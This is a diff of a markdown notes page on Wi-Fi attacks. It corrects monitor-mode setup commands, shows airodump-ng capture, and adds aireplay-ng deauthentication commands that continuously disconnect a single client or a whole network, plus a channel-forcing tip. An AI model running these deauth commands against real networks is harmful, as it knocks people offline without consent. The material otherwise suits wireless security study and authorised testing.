@@ -21,13 +21,13 @@ run _<mark style="color:blue;">`ifconfig`</mark>_ to check the name of your netw
 {% code lineNumbers="true" %}
 ```
 # turn down the network adapter
-iwconfig wlan0 down
+ifconfig wlan0 down
 
 # Changing into monitor mode
 iwconfig wlan0 mode monitor
 
 # turn up the network adapter
-iwconfig wlan0 up
+ifconfig wlan0 up
 
 ## run iwconfig to check if monitor mode is successfully enabled 
 ```
@@ -41,15 +41,35 @@ iwconfig wlan0 up
 airodump-ng wlan0 
 
 # for a specified network
-airodump-ng wlan0 --bssid [station MAC]
+airodump-ng wlan0 --bssid [MAC]
 
 ```
 {% endcode %}
+
+{% hint style="info" %}
+BSSID - MAC Address of an Access Point
+
+Station - MAC Address of a Client&#x20;
+{% endhint %}
 
 ## Deauth
 
 {% code lineNumbers="true" %}
 ```
 # on single client
+aireplay-ng --deauth 0 -a [bssid] -c [station] wlan0
+
+# on whole network
+aireplay-ng --deauth 0 -a [bssid] wlan0
 ```
 {% endcode %}
+
+{% hint style="danger" %}
+to change channel forcefully&#x20;
+
+1\) _<mark style="color:blue;">ifconfig</mark> wlan0 down_
+
+_2) <mark style="color:blue;">iwconfig</mark> wlan0 channel 3_
+
+_3) <mark style="color:blue;">ifconfig</mark> wlan0 up_
+{% endhint %}
